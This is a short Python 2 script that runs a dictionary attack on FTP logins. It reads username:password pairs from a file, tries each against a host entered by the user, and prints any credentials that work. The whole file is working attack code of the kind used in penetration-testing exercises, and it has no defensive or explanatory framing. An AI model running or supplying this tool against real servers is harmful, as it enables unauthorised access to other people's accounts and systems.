#!/usr/bin/python

import ftplib

def bruteLogin(hostname,passwdFile):
	try:
		pf=open(passwdFile)
		print("[+] File Found")
	except:
		print("[-] File not found: ")
		return
	for line in pf.readlines():
		username=line.split(':')[0]
		passwd=line.split(':')[1].strip("\n")
		print("[*] Trying admin: "+username+" pass: "+passwd)
		try:
			ftp=ftplib.FTP(hostname)
			ftp.login(username,passwd)
			print("[+] "+hostname+" FTP Login Enabled.")
			print("[+] Logged in as username: "+username+" with password: "+passwd)
			ftp.quit()
			return (username,passwd)
		except:
			pass
		

	print("[-] Password not found")
	print("[-] "+hostname+" FTP Annonymous Failed")

host=raw_input("[*] Enter the IP address: ")
passwdFile=raw_input("[*] Enter the path of password file: ")
bruteLogin(host,passwdFile)

